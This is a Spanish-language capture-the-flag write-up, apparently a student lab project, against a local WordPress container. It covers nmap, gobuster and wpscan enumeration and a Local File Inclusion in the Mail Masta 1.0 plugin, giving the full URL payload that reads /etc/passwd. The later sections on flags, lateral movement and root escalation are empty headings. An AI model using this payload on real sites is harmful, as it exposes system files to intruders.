# Grupo 4: Fallas en el Software y en la Integridad de los Datos

## **Índice**

<span style="color:black;">1. [ Enumeración](#Enumeración)</span><br>
<span style="color:black;">2. [ Buscar vulnerabilidades](#Vulnerabilidades)</span><br>
<span style="color:black;">3. [ Flag user.txt](#Flag1)</span><br>
<span style="color:black;">4. [ Movimiento lateral](#Movimiento)</span><br>
<span style="color:black;">5. [ Escalada de privilegios a Root](#Escalada)</span><br>
<span style="color:black;">6. [ Flag de Root](#flag-root)</span><br>
---

<br>

<h1 name="Enumeración">1. Enumeración</h1>

<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/nmap.png" alt="nmap">

> nmap -p- -sVC 172.17.0.2 

<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/gobuster.png" alt="gobuster">

> gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<br>
<h1 name="Vulnerabilidades">2. Buscar vulnerabilidades</h1>

<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/web.png" alt="Wordpress">

<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/wpscan.png" alt="wpscan">

<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/wpscan2.png" alt="wpscan2">


<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/mail-masta.png" alt="mail-masta">

[WordPress Plugin Mail Masta 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/40290)

<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/plugin-exploitdb.png" alt="plugin-exploitdb">

Como podemos ver, nos facilitan un link directo para poder visualizar el contenido del archivo /etc/passwd del servidor donde se está ejecutando el wordpress:

**http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd**

Lo cambiamos por **http://172.17.0.2/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd**


<img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/plugin-exploit.png" alt="plugin-exploit">

<br>
<h1 name="Flag1">3. Flag user.txt</h1>



<br>
<h1 name="Movimiento">4. Movimiento lateral</h1>


<br>
<h1 name="Escalada">5. Escalada de privilegios a Root</h1>


<br>
<h1 name="flag-root">6. Flag de Root</h1>

